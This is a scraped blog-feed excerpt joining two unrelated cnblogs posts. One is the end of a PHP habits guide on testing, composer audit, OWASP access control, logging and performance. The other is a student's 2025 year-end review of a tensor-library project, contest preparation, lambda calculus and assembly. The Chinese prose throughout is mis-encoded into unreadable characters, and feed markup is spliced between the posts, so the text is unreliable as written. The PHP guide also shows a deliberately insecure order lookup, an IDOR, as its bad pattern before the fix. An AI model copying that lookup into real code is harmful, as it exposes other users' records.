<p>Pest é£æ ¼æµè¯ï¼ç´§åä½å¯è¯»ï¼ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

it('applies discount with correct rounding', function () {
    $d = new Discount();
    expect($d-&gt;apply(999, 10))-&gt;toBe(899); // 99.9 rounds to 100
    expect($d-&gt;apply(1000, 10))-&gt;toBe(900);
});

it('rejects invalid percent', function () {
    $d = new Discount();
    expect(fn() =&gt; $d-&gt;apply(1000, -1))-&gt;toThrow(InvalidArgumentException::class);
    expect(fn() =&gt; $d-&gt;apply(1000, 101))-&gt;toThrow(InvalidArgumentException::class);
});
</code></pre>
<h3 id="ä¹ æ¯ä¸­çä¹ æ¯æè®¡ç®å-io-åå¼">ä¹ æ¯ä¸­çä¹ æ¯ï¼æè®¡ç®å IO åå¼</h3>
<p>ä¸å¡é»è¾åæ°æ®åºè°ç¨ãHTTP è°ç¨æ··å¨ä¸èµ·ï¼æµè¯å°±åå¾å°é¾ä¸ç¼æ¢ââæä»¥äººä»¬ä¸åäºã</p>
<p>è¿é¶åæ³æ¯ä¸ºè®¡ç®åçº¯å½æ°/æå¡ï¼æ IO æ¾å¨æ¥å£åé¢ãè¿ä¸æ¯"ä¼ä¸æ¶æ"ï¼æ¯å¯æµè¯æ§ã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>å­¦ä¼ä¸ºæ­£ç¡®æ§åå¯ç»´æ¤æ§è®¾è®¡ï¼èä¸åªæ¯"è®©ç«¯ç¹å·¥ä½"ã</p>
<h2 id="ä¹ æ¯-7æä¾èµå«çåæä¸å¯ååçæå»ºæ­¥éª¤">ä¹ æ¯ 7ï¼æä¾èµå«çåæä¸å¯ååçæå»ºæ­¥éª¤</h2>
<p>Composer ç <code>audit</code> å½ä»¤æ¯æç®åçèå©ä¹ä¸ãComposer ææ¡£è¯´å¾å¾æ¸æ¥ï¼audit ä¼æ ¹æ®å¬åæ£æ¥å·²å®è£çåï¼é»è®¤ç¨ Packagistï¼ï¼ç¨éåºä»£ç æ£æµåºå¼çåï¼å¯ä»¥å¨ CI ä¸­ç¨ã</p>
<h3 id="å¨-ci-ä¸­æ·»å å«æææäººä¼è¿è¡">å¨ CI ä¸­æ·»å ï¼å«ææ"æäººä¼è¿è¡"ï¼</h3>
<pre><code class="language-bash">composer install --no-interaction --no-progress --prefer-dist
composer audit --format=summary
</code></pre>
<h3 id="ç¨-composer-èæ¬åæå¼åèä¹ æ¯">ç¨ Composer èæ¬åæå¼åèä¹ æ¯</h3>
<pre><code class="language-json">{
  "scripts": {
    "check": [
      "composer validate --no-interaction",
      "composer audit --format=summary",
      "vendor/bin/phpstan analyse --memory-limit=1G",
      "vendor/bin/phpunit"
    ]
  }
}
</code></pre>
<p>ç°å¨å¼åèè¿è¡ï¼</p>
<pre><code class="language-bash">composer check
</code></pre>
<p>ä¸ä¸ªå½ä»¤ï¼ä¸è´çç»æã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>æä¾åºé¾é£é©å½ä½å·¥ç¨è´¨éçä¸é¨åï¼èä¸æ¯"ç¨åå®å¨é¨é¨çäº"ã</p>
<h2 id="ä¹ æ¯-8æ-owasp-å½æç»´æ¨¡åå«å½åè§æ¸å">ä¹ æ¯ 8ï¼æ OWASP å½æç»´æ¨¡åï¼å«å½åè§æ¸å</h2>
<p>OWASP Top 10 æ¯é¢åå¼åèçæè¯åºçº¿ãOWASP æåºï¼ææ°çæ¬æ¯ OWASP Top 10:2026ã</p>
<p>è®¿é®æ§å¶å¤±æä»æ¯ä¸»è¦é£é©ï¼2021 å¹´æ¯ A01ï¼2026 å¹´è¿æ¯ A01ï¼ã</p>
<p><strong>æ¢å¥è¯è¯´ï¼</strong> ææéè¯¯ä»æ¯åºäºææå¿«çæ¹å¼ä¹ä¸ã</p>
<h3 id="æ¯å¨ä¹ æ¯æ¾ä¸ç±»è®¿é®æ§å¶-bug-å¹¶æ¶é¤">æ¯å¨ä¹ æ¯ï¼æ¾ä¸ç±»è®¿é®æ§å¶ bug å¹¶æ¶é¤</h3>
<p>å¸¸è§æ¨¡å¼ï¼æ ID åè®°å½ï¼ä¸éå®å°å·²è®¤è¯ç¨æ·/ç§æ·ã</p>
<p><strong>ç³ç³çæ¨¡å¼ï¼</strong></p>
<pre><code class="language-php">$order = $repo-&gt;findById((int)$_GET['orderId']);
</code></pre>
<p><strong>æ´å¥½ï¼</strong></p>
<pre><code class="language-php">$userId = $auth-&gt;userId();
$orderId = (int)$_GET['orderId'];
$order = $repo-&gt;findForUser($orderId, $userId);
if ($order === null) {
    http_response_code(404);
    exit;
}
</code></pre>
<h3 id="å¦ä¸ä¸ªé«å½±åä¹ æ¯å°å¤ç¨é¢å¤çè¯­å¥">å¦ä¸ä¸ªé«å½±åä¹ æ¯ï¼å°å¤ç¨é¢å¤çè¯­å¥</h3>
<pre><code class="language-php">$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE email = :email');
$stmt-&gt;execute(['email' =&gt; $email]);
$user = $stmt-&gt;fetch();
</code></pre>
<p>ä¸ç¨è®°ä½æ¯ä¸ª OWASP ç±»å«ï¼æå®å½è¦çå°å¾ç¨ï¼</p>
<ul>
<li>è®¿é®æ§å¶</li>
<li>è¾å¥å¤ç</li>
<li>éç½®éè¯¯</li>
<li>ä¾åºé¾æé</li>
</ul>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>æå®å¨æ¬è½ç´æ¥æå»ºå°å®ç°å³ç­éã</p>
<h2 id="ä¹ æ¯-9æå¯è§æµæ§å½ä»£ç ç¹æ§å«åªå½åºç¡è®¾æ½">ä¹ æ¯ 9ï¼æå¯è§æµæ§å½ä»£ç ç¹æ§ï¼å«åªå½åºç¡è®¾æ½</h2>
<p>å¤§å¤æ°å·¥ç¨å¸åªå¨åºé®é¢åæå³å¿æ¥å¿ï¼è¿æ¯åçæ¥çã</p>
<p>è¿é¶ä¹ æ¯æ¯ç»éè¦ä»£ç è·¯å¾å ä»ªè¡¨ï¼</p>
<ul>
<li>è®¤è¯äºä»¶</li>
<li>æ¯ä»ç¶æè½¬æ¢</li>
<li>å¤é¨ API è°ç¨</li>
<li>éè¯ååé</li>
<li>"ä¸å¯è½"çåæ¯</li>
</ul>
<h3 id="æå°çç»æåæ¥å¿æ¨¡å¼psr-3-é£æ ¼">æå°çç»æåæ¥å¿æ¨¡å¼ï¼PSR-3 é£æ ¼ï¼</h3>
<pre><code class="language-php">&lt;?php
$logger-&gt;info('payment.authorize.started', [
    'order_id' =&gt; $orderId,
    'provider' =&gt; 'stripe',
    'idempotency_key' =&gt; $key,
]);

try {
    $res = $gateway-&gt;authorize($command);
    $logger-&gt;info('payment.authorize.ok', [
        'order_id' =&gt; $orderId,
        'provider_ref' =&gt; $res-&gt;reference,
    ]);
} catch (Throwable $e) {
    $logger-&gt;error('payment.authorize.failed', [
        'order_id' =&gt; $orderId,
        'error' =&gt; $e-&gt;getMessage(),
        'exception' =&gt; $e::class,
    ]);
    throw $e;
}
</code></pre>
<h3 id="äºææ¶æåæ¥çä¹ æ¯å³è-id">äºææ¶æåæ¥çä¹ æ¯ï¼å³è ID</h3>
<ul>
<li>ä¼ å¥è¯·æ±æå³è ID å¤´å°±éç¨</li>
<li>æ²¡æå°±çæä¸ä¸ª</li>
<li>æ¾å¨è¯¥è¯·æ±çæ¯ä¸ªæ¥å¿è¡é</li>
</ul>
<p>æ"æä»¬ææ¥å¿"åæ"æä»¬è½è¿½è¸ªåä¸ªç¨æ·æä½"ã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>åå°å¹³åçè§£æ¶é´ï¼MTTUï¼ï¼ä¸åªæ¯å¹³åæ¢å¤æ¶é´ã</p>
<h2 id="ä¹ æ¯-10æ§è½å·¥ä½ä»æµéå¼å§å«ç">ä¹ æ¯ 10ï¼æ§è½å·¥ä½ä»æµéå¼å§ï¼å«ç</h2>
<p>PHP ä¸­æ§è½é®é¢éå¸¸æ¥èªï¼</p>
<ul>
<li>N+1 æ°æ®åºæ¥è¯¢</li>
<li>å¤§éåºåå/ååºåå</li>
<li>å¯¹å¤§æ°æ®éçæ çå¾ªç¯</li>
<li>æè´µä»£ç è·¯å¾ä¸­ç¼ºå°ç¼å­</li>
</ul>
<p>é«å½±åä¹ æ¯æ¯æ¯å¨éä¸ä¸ªç«¯ç¹å"æ§è½éè¯»"ï¼</p>
<ul>
<li>å®è¿è¡å¤å°æ¥è¯¢ï¼</li>
<li>ååºæå¤å¤§ï¼</li>
<li>p95 å»¶è¿æ¯å¤å°ï¼</li>
<li>å¨å¹¶åä¸ä¼åçä»ä¹ï¼</li>
</ul>
<h3 id="å®ç¨çå¾®ä¼åä¹ æ¯æ¶é¤å¯é¿åçåé">å®ç¨çå¾®ä¼åä¹ æ¯ï¼æ¶é¤å¯é¿åçåé</h3>
<p>å¤çå¤§æ°æ®æ¶ï¼çæå¨è½åå°åå­ååï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

/**
 * @return Generator&lt;int, array{sku: string, qty: int}&gt;
 */
function streamItems(iterable $rows): Generator
{
    foreach ($rows as $row) {
        yield [
            'sku' =&gt; (string)$row['sku'],
            'qty' =&gt; (int)$row['qty'],
        ];
    }
}
</code></pre>
<p>å«æ··æ·å¾®ä¼ååçæ­£çèå©ãçæ­£çèå©éå¸¸æ¯æ¥è¯¢å¡å½¢åç¼å­ã</p>
<p><strong>ä¸ºä»ä¹è¿ä¸ªä¹ æ¯æç¨ï¼</strong></p>
<p>å­¦ä¼æä»£ç å³ç­åçäº§è¡ä¸ºï¼å»¶è¿ãååéãææ¬ï¼èç³»èµ·æ¥ã</p>
<h2 id="ä¹ æ¯-11å»ºç«å¤å©çä¸ªäººå·¥ç¨å¾ªç¯">ä¹ æ¯ 11ï¼å»ºç«å¤å©çä¸ªäººå·¥ç¨å¾ªç¯</h2>
<p>å¼ºå¤§çå¼åèä¸é æç»ªï¼é å¾ªç¯ï¼</p>
<ol>
<li>æ¹ç¹å°ä¸è¥¿</li>
<li>å¿«éæ¿å°åé¦</li>
<li>éå¤</li>
</ol>
<p>2026 å¹´å¯¹ PHP ææå¥½çå¾ªç¯ï¼</p>
<ul>
<li><strong>ç¼ç åï¼</strong> å®ä¹è¾å¥/è¾åºå½¢ç¶ï¼DTOãæä¸¾ãå¼å¯¹è±¡ï¼</li>
<li><strong>ç¼ç æ¶ï¼</strong> ä¿æå½æ°å°ï¼æ¸æ°å½åè½¬æ¢ï¼ç®¡éæå¸®å©ï¼</li>
<li><strong>æ¨éåï¼</strong> è¿è¡ <code>composer check</code>ï¼audit + éæåæ + æµè¯ï¼</li>
<li><strong>å®¡æ¥ä¸­ï¼</strong> æ¾ä¸åéãè¾¹çãè®¿é®æ§å¶å"å®éçå¤ææ§"</li>
<li><strong>åå¸åï¼</strong> å¨é£é©æ´æ¹çå°æ¹å æ¥å¿/ææ </li>
</ul>
<p>è¿ä¸æ¯ä»ªå¼ï¼æ¯åå¸ç»å¾èµ·æ¶é´èéªçä»£ç çæ¹å¼ã</p>
<h2 id="30-å¤©æå-php-æ°´å¹³çè®¡å">30 å¤©æå PHP æ°´å¹³çè®¡å</h2>
<p>æ³è¦è½å®éæ§è¡çï¼è¿æ ·åï¼</p>
<h3 id="ç¬¬-1-å¨ç°ä»£å·¥å·åºçº¿">ç¬¬ 1 å¨ï¼ç°ä»£å·¥å·åºçº¿</h3>
<ul>
<li>CI ä¸­å  <code>composer audit</code></li>
<li>å  PHPStan å¨éåº¦çº§å«å¹¶è®©å®éè¿</li>
<li>å  <code>composer check</code> èæ¬ç¨äºæ¬å°è¿è¡</li>
</ul>
<h3 id="ç¬¬-2-å¨æ°æ®è¾¹çåä¸åé">ç¬¬ 2 å¨ï¼æ°æ®è¾¹çåä¸åé</h3>
<ul>
<li>ç» 2-3 ä¸ªå³é®ç«¯ç¹å¼å¥ DTO è¾¹ç</li>
<li>å¨ä¸ä¸ªæ¨¡åéç¨æä¸¾æ¿æ¢å­ç¬¦ä¸²ç¶æå­æ®µ</li>
<li>å¨æé å½æ°æå±æ§é©å­éå ä¸åé</li>
</ul>
<h3 id="ç¬¬-3-å¨éè¦çæµè¯">ç¬¬ 3 å¨ï¼éè¦çæµè¯</h3>
<ul>
<li>ç»éé±/èå¥/ææ£æå¶ä»"ä¸å¡æ ¸å¿"å æµè¯</li>
<li>è¿è¡æ¶åè®¸çè¯ï¼è½¬åç°ä»£æµè¯åºçº¿ï¼PHPUnit 11 / Pestï¼</li>
</ul>
<h3 id="ç¬¬-4-å¨å®å¨åçäº§åé¦">ç¬¬ 4 å¨ï¼å®å¨åçäº§åé¦</h3>
<ul>
<li>ç»é¡¶çº§ææèµæºå®¡è®¡è®¿é®æ§å¶ï¼OWASP A01 æç»´ï¼</li>
<li>ç»é£é©æµç¨å å³è ID + ç»æåæ¥å¿</li>
<li>éä¸ä¸ªç«¯ç¹åå°æ¥è¯¢æ°éæææè´è½½å¤§å°</li>
</ul>
<p>æåºä¼æ³¨æå°å¤å©æåºï¼æ´å°åå½ï¼æ´å¿«å®¡æ¥ï¼æ´æ¸æ°éæã</p>
<h2 id="ç»è®º">ç»è®º</h2>
<p>ç°ä»£ PHPï¼8.4 å 8.5ï¼æä¾äºåå°æ ·æ¿ãæé«è¡¨è¾¾åçå·¥å·ââå±æ§é©å­ãéå¯¹ç§°å¯è§æ§ãç®¡éæä½ç¬¦ç­ã</p>
<p>ä½è¿äºå·¥å·åªæå¨ä¹ æ¯åå»ºçç³»ç»ä¸­æéè¦ï¼</p>
<ul>
<li>è¾å¥å°½æ©åæç±»ååæ°æ®</li>
<li>ä¸åéé è¿ç¶æ</li>
<li>åæåæµè¯æç»­è¿è¡</li>
<li>ä¾èµèªå¨å®¡è®¡</li>
<li>å®å¨æç»´æ¯å®ç°çä¸é¨å</li>
<li>çäº§åé¦å¨æ¥å¿åææ éå¯è§</li>
</ul>
<p>çå®å¢ééç"è¿é¶"å°±æ¯è¿æ ·ï¼ä¸æ¯è±éå¼éæï¼èæ¯æ èçä¹ æ¯ï¼å¤å©å°ä»£ç åºåå¾æ´å®¹ææ¹åèä¸æ¯ç ´åã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-01 07:49">2026-01-01 07:48</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">13</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19429440);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19429440', targetLink: 'https://www.cnblogs.com/catchadmin/p/19429440', title: '2026 å¹´ PHP å¼åèè¿é¶ å¿«éé«æå¼åå­¦ä¹ ä¹ æ¯' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 2025å¹´åº¦æ»ç» ]]></title>
    <link>https://www.cnblogs.com/SilverGo/p/19428614</link>
    <guid>8a32a198af015bc4a29db54023bcd46f</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/SilverGo/p/19428614" title="åå¸äº 2025-12-31 22:47">
    <span role="heading" aria-level="2">2025å¹´åº¦æ»ç»</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="table-of-contents">Table of Contents</h1>
<ol>
<li><a href="#org936be25" rel="noopener nofollow">2025å¹´åº¦æ»ç»</a></li>
<li><a href="#org07aceb4" rel="noopener nofollow">å³äºCtorch</a></li>
<li><a href="#orgc1859ea" rel="noopener nofollow">å³äºCSP-J</a></li>
<li><a href="#org1d85aae" rel="noopener nofollow">å³äºlambdaæ¼ç®ãUTMï¼éç¨å¾çµæºï¼ãCoq</a></li>
<li><a href="#org9a42a9e" rel="noopener nofollow">å³äºæ±ç¼</a></li>
<li><a href="#orgabafce1" rel="noopener nofollow">ä¸äºææ³</a></li>
<li><a href="#org89cb23b" rel="noopener nofollow">èµæ</a></li>
<li><a href="#org3319ea0" rel="noopener nofollow">ç»è¯­</a></li>
</ol>
<p>Powered by GhostFace's Emacs.</p>
<p><a id="org936be25"></a></p>
<h1 id="2025å¹´åº¦æ»ç»">2025å¹´åº¦æ»ç»</h1>
<p><a id="org07aceb4"></a></p>
<h2 id="å³äºctorch">å³äºCtorch</h2>
<p><strong>Ctorch è¯ççç¬¬166å¤©ã</strong><br>
æ²¡æ³å°ï¼cté½è¿ä¹å¤§äºï¼<strong>ä»ä¸ä¸ªåäººé¡¹ç®å°ç°å¨4äººçå°å¢éï¼ä»ä¸ä¸ªæ¨¡ç³çæ³æ³å°å¦ä»è¿ä¸è¡çä»£ç ï¼æ»è®¡5ä¸ªæ13å¤©ã</strong></p>
<p>ä¸å¾ä¸è¯´ï¼è¿æ®µæ¶é´ï¼å­¦å°äºå¾å¤ã</p>
<p><strong>ä»æ¥æ²¡æç¨è¿gitçäººï¼commitäºè¿160æ¬¡ï¼<br>
ä»æ¥æ²¡ææ¥è§¦è¿æ±ç¼çäººï¼ä¸ºäºæéä¼åãææç¼è¯å¨è¡ä¸ºï¼å­¦äº2ä¸ªæçæ±ç¼ï¼<br>
æ¾ç»è¿ç±»é½æ²¡åè¿çäººï¼åäº5ä¸ªå åè¡çç±»ï¼<br>
æ¾ç»è¿æ´ç´ ç©éµä¹é½ä¸ä¼åçèé¸¡ï¼ææäºä¸ä¸ªStrassen+ååçå¹¶è¡ç©éµä¹</strong>ï¼<br>
è¯¸å¦æ­¤ç±»ï¼ä¸ååä¸¾ã</p>
<p><a id="orgc1859ea"></a></p>
<h2 id="å³äºcsp-j">å³äºCSP-J</h2>
<p>æ¬èè»å·²ç»å¾é¿æ¶é´æ²¡ææ´æ°è¿æ¥å¿äºï¼å¯è½çåå æ¯æ¯è¾å¿ã</p>
<p><strong>æè¿å ä¸ªæï¼æ¬äººä¸ç´å¨å¿CSP-Jçåå¤ãCtorchçå¼åãCoqçå­¦ä¹ ä¸lambdaæ¼ç®ä¸ã<br>
åå¨æååèµ·äºãææ3ä¸ªæè¾¾çä¸ãçææï¼å½ç¶ï¼æææåäºï¼</strong>ï¼</p>
<p>è¿ä¸æ®µæ¶é´ï¼å·çé¢æ¯æä¹åä¸å¹´å·çé½å¤ï¼</p>
<p>20å¤å¤©ï¼æå­¦ä¹ äºï¼<strong>dpãå¾è®ºãå¹¶æ¥éãå æå¹¶æ¥éãæ¨¡æéç«ç­ç®æ³ï¼ä¹åä¸å¹´ä¹åªå­¦äºæåºï¼</strong></p>
<p><strong>æä¹è¯´å¢ï¼ä¹åä¸ç´æ²¡ææ¸æ¥çæç´¢ç®æ³ï¼ç°å¨çæ¥ä¹ä¸è¿å¦æ­¤ã</strong></p>
<p><a id="org1d85aae"></a></p>
<h2 id="å³äºlambdaæ¼ç®utméç¨å¾çµæºcoq">å³äºlambdaæ¼ç®ãUTMï¼éç¨å¾çµæºï¼ãCoq</h2>
<p>éåï¼åæ¯å ä¸ºç¥éäºC++æä¸ªå«lambdaè¡¨è¾¾å¼çä¸è¥¿ï¼éåå¨æ´è°·ä¸æç´¢ï¼<strong>æå¤çå°äºä¸ç¯è®²lambdaæ¼ç®çæç« </strong>ï¼</p>
<p>æ±çå¨å­¦æ ¡ä¸è¯¾æ èçå¿æï¼å­¦ä¹ äºlambdaæ¼ç®ï¼ç»æä¸åä¸å¯æ¶æ¾ã</p>
<p>å­¦å®ä¹åï¼æå¾ç¥<strong>lambdaæ¼ç®å¾çµå®å¤ï¼äºæ¯ä¹ï¼ææ³èµ·äºä¸ä¸ªå¥½ç©çä¸è¥¿ï¼ç¨æ ç±»ålambdaæ¼ç®ææUTMï¼éç¨å¾çµæºï¼ï¼è¿å½ç¶çè®ºå¯è¡</strong>ã</p>
<p>åæ­£æå¹³æ¶è½å¤æèçæ¶é´å¾å¤ï¼å¨é®è¿AIåï¼å¾ç¥è¿æ¯ä¸æ¬¡éå¸¸å°é¾ä½æ¯æ¶è·æå¤§çææï¼æä¾¿å¼å§äºæçæå»ºã</p>
<p><strong>ä¸æ¯ç¬ï¼ä¸ä¸ªæ¬ï¼ä¸ä¸ªèå­ï¼ä¸çè®ºæï¼ä¸æç´¢ï¼åªæèã<br>
æ¯å¤©ä¸æ¾å­¦çè·¯ä¸ï¼èµ°çéè¦35minå·¦å³ï¼è¿æ®µæ¶é´ï¼æå°±ä¼ä¸åå°æèå³äºUTMçé®é¢ã<br>
è¿ä¸ªè¿ç¨å¾ç½ï¼å ä¸ºæå¨æå»ºä¸ä¸ªå®æ´çä¸çï¼çè®ºä¸ï¼è¿å°ãä»ä»ä¾é ä»£å¥å®æè®¡ç®ãçâè®¡ç®æºâå¯ä»¥å®æä»»ä½å·¥ä½ï¼åªè¦ä½ æ³ï¼çè³å¯ä»¥è·ä¸ä¸ªä»¿ççWindows.</strong></p>
<p>åäºå¿«å åå¼ çº¸ï¼æææç½ï¼AIè¯´çé£å¥ï¼<strong>ãlambdaæ¼ç®å¯ä»¥ç»ä¹ æç»´ã</strong>ï¼çªç¶æä¸å¤©ï¼æçå¾è°ç¨ãéå½çæè§å®å¨åäºï¼æçå½æ°çæè§ä¹åäºã</p>
<p><strong>æä»¬é½è§å¾ï¼æ¯åæäºæ°å­ï¼ææäºå½æ°;</strong><br>
ä½æ¯ï¼Churchæ°å­åè¯æä»¬ï¼<strong>æ°å­ä¹æ¯å½æ°</strong>ã</p>
<p>ï¼è¿ä¸ªåä¸ºLUTMçUTMä»å¨è®¾è®¡ï¼ä¸è¿ï¼ç±äºCtorchå¯¹æçä¼åçº§æ´é«ï¼ç®åææ¶åå·¥ï¼ç­2æ16æ¥åå¸Ctorch RC 1ä¹ååç»§ç»­ï¼</p>
<p><strong>å­¦ä¹ å®lambdaæ¼ç®åï¼ææ¥è§¦å°äºCoqã<br>
Coqè¯æãå æ³å·¦é¶å¾ãçæè·¯è®©ææè§æ æ¯éæï¼è¿å®å¨é¢ è¦äºæå¯¹æ°å­¦å½çº³æ³çè®¤ç¥</strong>ã</p>
<p><strong>èä¸ï¼Coqä¸­å¯¹èªç¶æ°çå®ä¹ålambdaæ¼ç®çåè¡¨åºå¥çä¸è´ã<br>
æä¹è¯´å¢ï¼å¯è½è¿å°±æ¯ãä¸åä¸ç¦»å¶å®ãå§.</strong><br>
ä½æ¯ä»ç¶æ¯ä¸ºäºCtorchçå¼åï¼ææåäºCoqçå­¦ä¹ ã</p>
<p><a id="org9a42a9e"></a></p>
<h2 id="å³äºæ±ç¼">å³äºæ±ç¼</h2>
<p>å¨è¿ä¹åï¼æå­¦ä¹ äºArm64æ±ç¼ã<br>
ä»ä»æ¯ååºä¸ä¸ªHello Worldï¼æå°±è±äº2å¤©ï¼å½ç¶ï¼æå¨å­¦æ ¡æ¯å¤©åªæ10minè½ç¨çµèï¼20minå¯ä»¥åAIå¯¹è¯ï¼.<br>
ä½ä»æ­¤ä¸æ¬¡ï¼æå°±æç½äºï¼C++ä¸­éå½ãè°ç¨æ¯å¦ä½åçï¼æ¬è´¨å¶å®å°±æ¯å°x29,x30å¯å­å¨çå¼ä¿®æ¹ï¼<br>
æä¹æç½äºï¼ä»ä¹æ¯ãæ æº¢åºãï¼ä»ä¹æ¯ãè°ç¨æ ãã<br>
å è¡çC++æ¢ææ±ç¼å°±å¯è½éè¦æ°åè¡ï¼è¿è®©æåä»£ç æ¶ä¼æèçæ±ç¼çæ ·å­ã<br>
ä¸å¾ä¸è¯´ï¼è¿ç¡®å®æ¯ä¸æ¬¡å¾å¥½çåç»ã</p>
<p><a id="orgabafce1"></a></p>
<h2 id="ä¸äºææ³">ä¸äºææ³</h2>
<p>åé¦è¿å ä¸ªæææç»åçï¼å¯è½æ¯æä¹åä¸å¹´å­¦çé½è¦å¤ï¼é½è¦æï¼</p>
<p><strong>è¿äºç¥è¯æ çå¸¦ç»äºæå¾å¼ºçå¡é ä½ç¨ï¼<br>
è®¾è®¡LUTMï¼é»ç¼äºæè¿è¡2å°æ¶ä»¥ä¸çæ·±åº¦æèçè½åï¼<br>
å­¦ä¹ æ±ç¼ï¼è®©æå¯¹åºå±æäºææ§ï¼<br>
å­¦ä¹ lambdaæ¼ç®ï¼è®©æå¯¹å½æ°æäºæ´å½»åºçè®¤è¯ï¼<br>
å¯ä»¥è¯´ï¼å¯¹ä¸ä¸ªåä¸­çèè¨ï¼è¿æ¡è·¯å¾ç¬ä¸æ äºã<br>
æç»è¯äºä¸ç¾¤å¿åéåçæåï¼æäºèªå·±çå¢éãç»ç»ï¼<br>
æ¾ç»é£ä¸ªè¢«å²ç¬âåè¿äºæä»ä¹ç¨âãâè¿ä¸ªå¥é½æ¿ä¸å°âçäººï¼å¦ä»ç«æä¸ºä¸ä¸ªå¼æºé¡¹ç®çå¼åèãCSP-Jççä¸ã</strong><br>
<strong>æ¯«æ çé®ï¼è¿æ¯æ æ¯æä»·å¼çåå¹´ï¼</strong></p>
<p><a id="org89cb23b"></a></p>
<h1 id="èµæ">èµæ</h1>
<p>ä¸é¢æ¾ä¸ç¹èµæ</p>
<p>1.è®¾è®¡LUTMæ¶ä¸Deepseekçå¯¹è¯ï¼<a href="https://chat.deepseek.com/share/wednovjlp5sa013j4q" target="_blank" rel="noopener nofollow">https://chat.deepseek.com/share/wednovjlp5sa013j4q</a><br>
2.æç« ï¼ãæ­åèªå·±ï¼æææåãââââCSP-Jçä¸è·å¥æè¨ï¼<a href="https://www.cnblogs.com/SilverGo/p/19223328" target="_blank">https://www.cnblogs.com/SilverGo/p/19223328</a><br>
3.æç« ï¼ãéè¢­å¯¼è®ºÂ·åä¸­ççå®ä¹¦ãï¼<a href="https://www.cnblogs.com/SilverGo/p/19284999" target="_blank">https://www.cnblogs.com/SilverGo/p/19284999</a><br>
4.æç« ï¼ãç©éµä¹æ³ä¼åãï¼<a href="https://www.cnblogs.com/SilverGo/p/19019364" target="_blank">https://www.cnblogs.com/SilverGo/p/19019364</a><br>
5.Ctorchçgithubï¼<a href="https://github.com/ShengFlow/CTorch/tree/feature-nn.Module?tab=contributing-ov-file" target="_blank" rel="noopener nofollow">https://github.com/ShengFlow/CTorch/tree/feature-nn.Module?tab=contributing-ov-file</a><br>
6.ä»¥ä¸æ¯å¾çï¼<br>
<img src="https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224442471-111964913.png" alt="æªå±2025-12-28 10.22.19" width="1512" height="982" loading="lazy"><br>
<img src="https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224520016-1653169643.png" alt="æªå±2025-12-18 06.31.21" width="1512" height="982" loading="lazy"><br>
<img src="https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224619686-610660255.png" alt="æªå±2025-10-04 16.25.21" width="1512" height="982" loading="lazy"></p>
<p><a id="org3319ea0"></a></p>
<h1 id="ç»è¯­">ç»è¯­</h1>
<blockquote>
<p>âPut yourself in places that are gonna cause you to stretch<br>
è®©èªå·±ç½®èº«äºè½ä¿ä½¿èªå·±çªç ´çå¢å°<br><br>
A fighter isn't someone that never fails<br>
çæ­£çåå£«å¹¶éæ°¸ä¸å¤±è´¥<br><br>
A fighter is someone who never quits<br>
èæ¯æ°¸ä¸è¨å¼<br><br>
You are more to me than you could never now<br>
ä½ å¯¹æèè¨è¿æ¯èªå·±æ³è±¡çæ´éè¦<br><br>
And I know I've got a full room of fighters in here right<br>
æ­¤å»ææ·±ç¥è¿æ»¡åº§çæ¯åèâ<br></p>
</blockquote>
<blockquote>
<p>âI see ,I like ,I go ,I get.<br>
ç®ä¹æåï¼å¿ä¹æåï¼è¸ä¸å¾ç¨ï¼å¿å¨å¿å¾ï¼â<br></p>
</blockquote>
<blockquote>
<p>âä¸ºå¤©å°ç«å¿ï¼<br><br>
ä¸ºçæ°ç«å½ï¼<br><br>
ä¸ºå¾å£ç»§ç»å­¦ï¼<br><br>
ä¸ºä¸ä¸å¼å¤ªå¹³âââââå®Â·å¼ è½½ãæ¨ªæ¸ åå¥ã<br></p>
</blockquote>
<blockquote>
<p>âèº«å¤ä½è°·ä¸èªå¼ï¼æå½ç±æä¸ç±å¤©ã<br><br>
æ äººæ¶æéäºå¿ï¼æèªè¸éªè³å±±å·ã<br><br>
è¥æ¯å½ä¸­æ æ­¤è¿ï¼äº¦å¯å­¤èº«ç»æä»ã<br><br>
çº¢å°èµ æä¸å°ºåï¼éæ¢ç¦é©¬ä¸ä¸è¡ã<br><br>
ä¸äººæè·¯ä¹ç»æ¶§ï¼ç¬è§ä¼çæ­¢æ­¥åã<br><br>
æµ·å°å°½å¤´å¤©ä½å²¸ï¼å±±ç»ç»é¡¶æä¸ºå³°ã<br><br>
å¦è¥ä¸å±±è½åèµ·ï¼å¤§é¹å±ç¿ä¹ä¸éã<br><br>
ä¸å¥çº¢å°æ¢¦æçï¼ä¸ææéå¿å¢åã<br><br>
ä¸ææéè§çæï¼ææ¥æ·éçäºçã<br><br>
å¤©é¨å°è³ç¾è¿å¼ï¼æå°è½»ç¬é®ä»æ¥ã<br><br>
ä½é¡»æ¶æéäºå¿ï¼æèªåäºè³å±±å·ï¼âââââå¾éå®¢ãéäºå¿ã<br></p>
</blockquote>
<p><strong>2025ï¼å¯¹æèè¨ï¼æ³¨å®æ¯é¾å¿çä¸å¹´.</strong><br>
